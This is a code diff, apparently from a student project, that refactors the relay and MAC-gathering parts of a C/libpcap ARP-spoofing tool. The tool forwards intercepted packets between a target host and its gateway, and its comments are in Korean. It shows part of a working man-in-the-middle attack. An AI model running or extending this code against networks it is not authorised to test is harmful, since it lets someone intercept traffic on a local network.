@@ -43,34 +43,20 @@ void *thread_relay(void *arg)
 
         if (compareMac(eth_hdr->ether_shost, add_save->save_target_mac) == 0 && ip_hdr->saddr == add_save->save_target_ip)
         {
-
-            for (int i = 0; i < 6; i++)
-            {
-                eth_hdr->ether_dhost[i] = add_save->save_gateway_mac[i];
-                eth_hdr->ether_shost[i] = mymac[i];
-            }
+            memcpy(eth_hdr->ether_dhost, add_save->save_gateway_mac, 6);
+            memcpy(eth_hdr->ether_shost, mymac, 6);
             memcpy(cp_packet, packet, pktsize);
 
             if (pcap_sendpacket(pcap_handle, cp_packet, (int)pktsize) == -1)
-            {
                 printf(" error\n");
-                continue;
-            }
             else
-            {
                 printf("Sender relay 전송 성공! \n");
-                continue;
-            }
         }
-
-        if (compareMac(eth_hdr->ether_shost, add_save->save_gateway_mac) == 0 && ip_hdr->daddr == add_save->save_target_ip)
+        else if (compareMac(eth_hdr->ether_shost, add_save->save_gateway_mac) == 0 && ip_hdr->daddr == add_save->save_target_ip)
         {
 
-            for (int i = 0; i < 6; i++)
-            {
-                eth_hdr->ether_dhost[i] = add_save->save_target_mac[i];
-                eth_hdr->ether_shost[i] = mymac[i];
-            }
+            memcpy(eth_hdr->ether_dhost, add_save->save_target_mac, 6);
+            memcpy(eth_hdr->ether_shost, mymac, 6);
             memcpy(cp_packet, packet, pktsize);
 
             if (pcap_sendpacket(pcap_handle, cp_packet, (int)pktsize) == -1)
@@ -97,12 +83,7 @@ int main(int argc, char *argv[])
     strcpy(s.ifr_name, "enp0s3");
     // strcpy(s.ifr_name, dev);
     ioctl(fd, SIOCGIFHWADDR, &s);
-
-    for (int x = 0; x < 6; ++x)
-    {
-        mymac[x] = (u_int8_t)s.ifr_addr.sa_data[x];
-    }
-
+    memcpy(mymac, s.ifr_addr.sa_data, 6);
     //--------------------------------------------
 
     struct ifreq ifr;
@@ -146,10 +127,7 @@ int main(int argc, char *argv[])
         {
             infect_addr_save->save_target_ip = receive_packet->arp_sender_ip;
             infect_addr_save->save_gateway_ip = receive_packet->arp_target_ip;
-            for (int i = 0; i < 6; i++)
-            {
-                infect_addr_save->save_target_mac[i] = receive_packet->eth_src_mac[i];
-            }
+            memcpy(infect_addr_save->save_target_mac, receive_packet->eth_src_mac, 6);
 
             pthread_create(&thread[0], NULL, thread_infect, (void *)infect_addr_save);
             break;
@@ -164,12 +142,10 @@ int main(int argc, char *argv[])
         pcap_next_ex(pcap_handle, &header, &packet);
         struct eth_arp_header *receive_packet = (struct eth_arp_header *)packet;
         // 공격 대상에서 reply가 왔다면 패킷 relay 시작
-        if (compareMac(receive_packet->eth_dst_mac, mymac) == 0 && receive_packet->arp_sender_ip == infect_addr_save->save_gateway_ip && ntohs(receive_packet->type) == ETHERTYPE_ARP && ntohs(receive_packet->opcode) == ARPOP_REPLY)
+        if (compareMac(receive_packet->eth_dst_mac, mymac) == 0 && receive_packet->arp_sender_ip == infect_addr_save->save_gateway_ip &&
+            ntohs(receive_packet->type) == ETHERTYPE_ARP && ntohs(receive_packet->opcode) == ARPOP_REPLY)
         {
-            for (int i = 0; i < 6; i++)
-            {
-                infect_addr_save->save_gateway_mac[i] = receive_packet->eth_src_mac[i];
-            }
+            memcpy(infect_addr_save->save_gateway_mac, receive_packet->eth_src_mac, 6);
             break;
         }
     }
